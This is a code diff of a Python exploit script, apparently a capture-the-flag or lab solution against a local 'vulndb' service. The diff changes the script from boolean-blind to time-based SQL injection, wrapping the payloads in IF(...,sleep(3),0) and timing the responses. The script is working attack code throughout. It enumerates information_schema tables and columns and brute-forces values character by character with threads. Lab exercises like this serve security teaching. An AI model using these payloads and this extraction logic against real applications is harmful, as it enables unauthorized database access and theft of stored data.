@@ -1,7 +1,7 @@
 from concurrent.futures import ThreadPoolExecutor
 import requests, re, string
 
-TARGET = 'http://127.0.0.1:1337/blind-based'
+TARGET = 'http://127.0.0.1:1337/time-based'
 
 def get_length(post_param:str, column_name: str, table_name: str, suffix: str = '') -> int:
     """
@@ -30,7 +30,7 @@ def get_length(post_param:str, column_name: str, table_name: str, suffix: str = 
     # function to combine all of the rows for the dumped column into a
     # single row.
     ##
-    payload = "Classic' and length((SELECT group_concat({column_name}) FROM {table_name} {suffix}))={test_len}#".format(
+    payload = "Classic' and IF(length((SELECT group_concat({column_name}) FROM {table_name} {suffix}))={test_len}, sleep(3), 0)#".format(
         column_name=column_name,
         table_name=table_name,
         suffix=suffix,
@@ -41,7 +41,7 @@ def get_length(post_param:str, column_name: str, table_name: str, suffix: str = 
     while test_len < 1000:
         test_payload = payload.format(test_len=test_len)
         response = requests.post(TARGET, data={post_param: test_payload})
-        if 'Is In Stock: True' in response.text:
+        if response.elapsed.total_seconds() > 3:
             return test_len
         test_len += 1
 
@@ -51,7 +51,7 @@ def try_char(post_param: str, payload: str, index: int, char: str) -> tuple:
     response = requests.post(
         TARGET, data={post_param: payload.format(char=char, index=index)}
     )
-    return ('Is In Stock: True' in response.text, char)
+    return (response.elapsed.total_seconds() > 3, char)
 
 def exploit(post_param:str, column_name: str, table_name: str, suffix: str = '') -> list:
     """
@@ -86,7 +86,7 @@ def exploit(post_param:str, column_name: str, table_name: str, suffix: str = '')
     # Don't forget that string comparisons are CASE INSENSITVE and you
     # need to fix it.
     ##
-    payload = "Classic' and CAST(substring((SELECT group_concat({column_name}) FROM {table_name} {suffix}),{index},1) AS BINARY)=CAST('{char}' AS BINARY)#".format(
+    payload = "Classic' and IF(CAST(substring((SELECT group_concat({column_name}) FROM {table_name} {suffix}),{index},1) AS BINARY)=CAST('{char}' AS BINARY), sleep(3), 0)#".format(
         column_name=column_name,
         table_name=table_name,
         index='{index}',
@@ -111,14 +111,15 @@ def exploit(post_param:str, column_name: str, table_name: str, suffix: str = '')
                 found_char, char = result
                 if found_char:
                     dumped_value = dumped_value + char
+                    print(dumped_value)
                     break
 
     return sorted(dumped_value.split(','))    
 
 def main():
-    flag_table = exploit('blind', 'table_name', 'information_schema.tables', suffix='WHERE table_schema = "vulndb"')[0]
-    flag_column = exploit('blind', 'column_name', 'information_schema.columns', suffix='WHERE table_name = "{}"'.format(flag_table))[0]
-    flag = exploit('blind', flag_column, flag_table)
+    flag_table = exploit('time', 'table_name', 'information_schema.tables', suffix='WHERE table_schema = "vulndb"')[0]
+    flag_column = exploit('time', 'column_name', 'information_schema.columns', suffix='WHERE table_name = "{}"'.format(flag_table))[0]
+    flag = exploit('time', flag_column, flag_table)
     print("Flag: " + flag[0])
 
 if __name__ == "__main__":
